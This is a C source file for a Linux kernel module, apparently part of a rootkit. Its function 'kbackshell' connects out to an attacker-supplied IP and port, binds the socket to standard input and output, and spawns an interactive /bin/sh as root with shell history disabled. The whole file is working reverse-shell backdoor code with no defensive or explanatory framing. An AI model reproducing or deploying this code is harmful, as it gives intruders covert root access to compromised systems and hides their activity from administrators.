#include <linux/syscalls.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>
#include "syscalltable.h"

typedef struct _param_data
{
	unsigned char sign[8];
	unsigned int nip;
	unsigned short hport;
} param_data, *param_data_t;

static char __user *shell = "/bin/sh";
static char __user *arg[] = {"-i", NULL};
static char __user *env[] =
{
	"PATH=/bin:/usr/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/sfw/bin:/usr/ccs/bin",
	"USER=root", "HOME=/root", "HISTFILESIZE=0", "HISTSIZE=0",
	 NULL
};

void kbackshell(void* args)
{
	int sockfd = 0, i = 0;
	struct sockaddr_in __user dstaddr;
	param_data_t param = (param_data_t) args;
	unsigned long sock_args[4] = {0};
	mm_segment_t old_fs;
	//Do some usefull
	old_fs = get_fs();
	set_fs(KERNEL_DS);
	for(i = 0;i < 4096;i ++) sys_close(i);

	//Socket connect
	sock_args[0] = AF_INET;
	sock_args[1] = SOCK_STREAM;
	sock_args[2] = 0;

	sockfd = socketcall(SYS_SOCKET, sock_args);
	if(sockfd == -1)
	{
		printk(KERN_ALERT "socket create error.\r\n");
		return;
	}

	memset(&dstaddr, 0, sizeof(dstaddr));
	dstaddr.sin_family = AF_INET;
	dstaddr.sin_port = htons(param->hport);
	dstaddr.sin_addr.s_addr = param->nip;
	sock_args[0] = sockfd;
	sock_args[1] = (unsigned long) &dstaddr;
	sock_args[2] = (unsigned long) sizeof(dstaddr);

	if(-1 == socketcall(SYS_CONNECT, sock_args))
	{
		printk(KERN_ALERT "socket connect error.\r\n");
		goto FINAL;
	}
	for(i = 0;i < 3;i ++) dup2(sockfd, i);
	call_usermodehelper(shell, arg, env, 1);
	for(i = 0;i < 3;i ++) sys_close(i);
FINAL:
	sys_close(sockfd);	
	set_fs(old_fs);
}
